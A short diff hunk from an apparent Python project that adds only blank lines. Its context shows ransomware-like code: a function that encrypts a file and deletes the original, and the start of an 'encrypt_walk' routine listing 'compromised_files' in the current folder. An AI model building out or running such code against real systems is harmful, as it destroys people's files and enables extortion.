@@ -38,6 +38,8 @@ def encrypt(file, shared_key):
     os.remove(file)
     return f"{file}.encrypted"
 
+
+
 def encrypt_walk(shared_key):
     compromised_files = []
     current_folder = os.getcwd()
